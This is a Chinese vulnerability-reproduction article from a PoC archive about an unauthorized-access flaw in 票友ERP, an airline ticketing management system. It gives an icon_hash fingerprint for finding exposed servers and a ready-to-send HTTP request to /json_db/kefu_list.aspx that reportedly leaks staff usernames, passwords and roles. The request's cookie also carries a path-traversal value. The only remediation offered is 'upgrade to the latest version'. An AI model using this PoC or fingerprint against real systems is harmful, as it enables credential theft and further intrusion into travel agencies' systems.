#  票友ERP管理系统未授权访问漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-10 02:48  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# 票友ERP管理系统未授权访问漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1icnT42zHPLRXzApokVH5M28JWAk04icgyx4DZqtPcGPWfbEVoicEJH4soWibiaJERtyay7aF6fdia3lW1W3WqNuP97kxibkoibuJmUwk/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
票友ERP管理系统是一款专注于航空票务领域的专业管理软件，主要面向机票代理公司、旅行社等企业，帮助  
其实现业务流程数字化管理和高效运营。  
攻击者可通过直接访问接口，获取系统客服人员的相关信息（如用户名、密码、角色等），进而可能进一步  
渗透系统或实施其他攻击。未授权漏洞通常因系统未对用户权限进行严格校验，导致敏感接  
口可被未授权访问。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="1089051053"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2KsjyY4ZYobiarykaRLoeHa8ufyIhicRullN2j7UR77R7ffiadcceg63UvQEFRIP2z2MiaF0gPmcu4Wr8ibX8YEvO4a8ym6jBwpny4/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
GET /json_db/kefu_list.aspx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3Fz3n8ThaAUgyiaJWXmFEFic9TaiaB4NbmQpjJD32aLRvFX1NxGicuLibadApV6G9ZgLppK1XYGj9YZmR2f2S2kmqiauYLYJw8qJPgg/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
